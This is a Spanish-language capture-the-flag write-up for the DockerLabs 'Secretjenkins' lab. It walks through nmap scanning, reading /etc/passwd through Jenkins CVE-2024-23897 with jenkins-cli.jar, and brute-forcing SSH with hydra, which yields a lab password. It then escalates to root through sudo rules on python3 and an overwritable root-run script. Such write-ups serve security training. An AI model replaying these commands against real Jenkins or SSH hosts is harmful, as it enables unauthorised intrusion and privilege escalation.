# Máquina Secretjenkins

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p22,8080 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE    REASON
22/tcp   open   ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 94fb28597fae02c0564607338cac5285 (ECDSA)
|_  256 43075030bb28b0739b7c0c4e3fc9bf02 (ED25519)
8080/tcp open   http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.18)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Pasted image 20240511183108](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/f6863828-3c2c-4274-927b-ab323dffe3d4)

--------------
## Explotación

Hay un proyecto en **github** que maneja una vulnerabilidad específica para esta versión de **Jenkins**.
Link al exploit -> [Exploit](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897)

Seguimos los pasos, y lo primero de todo es descargarse el **jenkins-cli.jar** para poder explotar un **LFI**:

```
http://172.17.0.2:8080/jnlpJars/jenkins-cli.jar
```

![Pasted image 20240511183553](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/766d44d1-f252-40b5-8452-e220c7372428)

Con este archivo ejecutamos el siguiente comando para tratar de leer el **/etc/passwd**:

```shell
java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node "@/etc/passwd"
```

![Pasted image 20240511183811](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/2fe80803-8b96-4ec2-9383-14930637ce4e)

Tenemos el **LFI** y vemos un usuario **pinguinito** y **bobby**.
Tras probar con fuerza bruta al **ssh** sobre ambos usuarios, encontramos la contraseña de **bobby**.

```shell
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
-------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate
```

Estamos dentro !

------------
## Escalada de privilegios

```shell
sudo -l
--------------
User bobby may run the following commands on 1e9c73d6dd94:
    (pinguinito) NOPASSWD: /usr/bin/python3
```

Podemos ejecutar **python** como el user **pinguinito**. Podemos abusar de este con:

```shell
sudo -u pinguinito /usr/bin/python3
-> import os
-> os.system("bash")
whoami
-------------------------------------
pinguinito
```

Volvemos a hacer **sudo -l**:

```shell
sudo -l
-----------------
User pinguinito may run the following commands on 1e9c73d6dd94:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Podemos ejecutar un script que hay en **opt** como **root**.

![Pasted image 20240511185829](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a28f6928-28e9-43f3-ab5b-cc7f2c4584ae)

```shell
ls -l /opt/script.py
------------------------------------
-r-xr--r-- 1 pinguinito root 272 May 11 08:22 /opt/script.py
```

Observamos que somos el propietario del script, podemos darle permisos, modificarlo, y ejecutarlo como **root**:

```shell
chmod 744 /opt/script.py 
pinguinito@1e9c73d6dd94:/opt$ echo "import os" > /opt/script.py 
pinguinito@1e9c73d6dd94:/opt$ echo 'os.system("bash")' >> /opt/script.py 
pinguinito@1e9c73d6dd94:/opt$ sudo /usr/bin/python3 /opt/script.py
```

![[Pasted image 20240511190820.png]]

```shell
root@1e9c73d6dd94:/opt# whoami
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema !
